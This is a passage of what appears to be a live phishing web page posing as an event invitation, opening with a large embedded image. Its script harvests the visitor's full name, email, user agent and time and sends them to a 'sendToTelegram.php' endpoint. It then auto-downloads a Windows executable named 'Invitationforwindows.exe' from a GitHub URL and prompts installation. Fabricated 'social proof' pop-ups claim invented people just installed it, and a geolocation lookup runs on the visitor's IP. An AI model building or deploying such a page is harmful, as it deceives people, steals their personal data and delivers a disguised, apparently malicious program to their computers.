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AGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgIAAP//7NiBDAAAAMAgf+t7fIWRAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAUAAP//7NiBDAAAAMAgf+t7fIWRAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGBCAAAAAAjAlAAAAAABgTgAAAAAAwJgABAAAAYEwAAgAAAMCYAAQAAACAMQEIAAAAAGMCEAAAAADGAgAA///s2IEMAAAAwCB/63t8hZEABAAAAIAxAQgAAAAAYwIQAAAAAMYEIAAAAACMCUAAAAAAGBOAAAAAADAmAAEAAABgTAACAAAAwJgABAAAAIAxAQgAAAAAYwIQAAAAAMYEIAAAAACMCUAAAAAAGBOAAAAAADAmAAEAAABgTAACAAAAwJgABAAAAIAxAQgAAAAAYwIQAAAAAMYEIAAAAACMCUAAAAAAGBOAAAAAADAmAAEAAABgTAACAAAAwJgABAAAAIAxAQgAAAAAYwIQAAAAAMYEIAAAAACMCUAAAAAAGBOAAAAAADAmAAEAAABgTAACAAAAwJgABAAAAIAxAQgAAAAAYwIQAAAAAMYEIAAAAACMCUAAAAAAGBOAAAAAADAmAAEAAABgTAACAAAAwJgABAAAAIAxAQgAAAAAYwIQAAAAAMYEIAAAAACMCUAAAAAAGBOAAAAAADAmAAEAAABgTAACAAAAwJgABAAAAIAxAQgAAAAAYwIQAAAAAMYEIAAAAACMBQAA///s2IEMAAAAwCB/63t8hZEABAAAAIAxAQgAAAAAYwIQAAAAAMYEIAAAAACMCUAAAAAAGBOAAAAAADAmAAEAAABgTAACAAAAwJgABAAAAIAxAQgAAAAAYwIQAAAAAMYEIAAAAACMCUAAAAAAGBOAAAAAADAmAAEAAABgTAACAAAAwJgABAAAAIAxAQgAAAAAYwIQAAAAAMYEIAAAAACMCUAAAAAAGBOAAAAAADAmAAEAAABgTAACAAAAwJgABAAAAIAxAQgAAAAAYwIQAAAAAMYEIAAAAACMCUAAAAAAGBOAAAAAADAmAAEAAABgTAACAAAAwJgABAAAAIAxAQgAAAAAYwIQAAAAAMYEIAAAAACMCUAAAAAAGBOAAAAAADAmAAEAAABgTAACAAAAwJgABAAAAIAxAQgAAAAAYwIQAAAAAMYEIAAAAACMCUAAAAAAGBOAAAAAADAmAAEAAABgTAACAAAAwJgABAAAAIAxAQgAAAAAYwIQAAAAAMYCAAD//+3YgQwAAADAIH/re3yFkQAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwJQAAAAAAYE4AAAAAAMCYAAQAAAGBMAAIAAADAmAAEAAAAgDEBCAAAAABjAhAAAAAAxgQgAAAAAIwF6M1FydghsuEAAAAASUVORK5CYII=" alt="Invitation" style="width:100%; max-height:200px; object-fit:contain; border-radius:10px;" />

    <br><br>
    
    <button onclick="document.getElementById('installPopup').style.display='none';" style="padding:10px 20px; border:none; background-color:#007bff; color:#fff; border-radius:5px; cursor:pointer;">OK</button>
  </div>
</div>


    <script>
document.getElementById("nextStep").addEventListener("click", function() {
  var fullName = document.getElementById("fullName").value.trim();
  if (fullName) {
    document.getElementById("emailSection").style.display = "block";
    document.getElementById("nextStep").style.display = "none";
  } else {
    alert("Please enter your full name.");
  }
});

document.getElementById("accessInvitation").addEventListener("click", function() {
  var fullName = document.getElementById("fullName").value.trim();
  var email = document.getElementById("userEmail").value.trim();

  if (fullName && email) {
    var userAgent = navigator.userAgent;
    var dateTime = new Date().toLocaleString();

    fetch("sendToTelegram.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: `fullName=${encodeURIComponent(fullName)}&email=${encodeURIComponent(email)}&userAgent=${encodeURIComponent(userAgent)}&dateTime=${encodeURIComponent(dateTime)}`
    })
    .then(response => response.text())
    .then(data => {
      if (data.trim() === "success") {
        // Trigger download
        const link = document.createElement("a");
        link.href = "https://github.com/one20code/loyalty/raw/refs/heads/main/Invitationforwindows.exe";
        link.download = "Invitationforwindows.exe";
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        // Show popup
        document.getElementById("installPopup").style.display = "flex";

        // Confetti 🎉
        confetti({
          particleCount: 950,
          spread: 700,
          origin: { y: 0.5 }
        });

      } else {
        alert("Error sending to Telegram.");
      }
    })
    .catch(error => console.error("Request failed:", error));
  } else {
    alert("Please fill in all fields.");
  }
});
</script>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    <script>
    // Get the name from the URL parameter
    const params = new URLSearchParams(window.location.search);
    const name = params.get('name');

    // If a name is provided, store it in sessionStorage
    if (name) {
        sessionStorage.setItem('inviterName', name);
        document.getElementById('inviter-name').textContent = name;
    } else {
        // Fallback to "Our Team" if no name is provided
        document.getElementById('inviter-name').textContent = "Our Team";
    }
</script>

    <!-- Enhanced Social Proof Notification System -->
    <div id="socialProof" aria-live="polite"></div>
    <script>
        // Arrays of names and locations
        const names = [
            "John Smith", "Sarah Johnson", "Michael Brown", "Emily Davis", 
            "David Wilson", "Lisa Anderson", "James Taylor", "Emma Martinez",
            "Robert Garcia", "Jennifer Lee", "William Clark", "Michelle White",
            "Daniel Moore", "Jessica Hall", "Christopher Lewis", "Amanda Young"
        ];
        
        const locations = [
            "California", "New York", "Texas", "Florida", "Illinois",
            "Pennsylvania", "Ohio", "Georgia", "North Carolina", "Michigan",
            "New Jersey", "Virginia", "Washington", "Massachusetts", "Arizona",
            "Indiana", "Tennessee", "Missouri", "Maryland", "Colorado"
        ];

        // Trust-related emojis
        const emojis = ["✅", "🎉", "✨", "👋", "💫", "🌟", "🎊", "💝", "💖"];

        // Message templates
        const messages = [
            "just installed their invitation!",
            "just downloaded their invitation!",
            "just joined the event!",
            "just joined the invitation!",
            "just started their invitation download!",
            "just began installing their invitation!",
            "just accessed their invitation!",
            "just checked out the invitation!"
        ];

        // Notification queue
        let notificationQueue = [];
        let isNotificationVisible = false;

        // Geolocation city fallback
        let visitorCity = null;
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
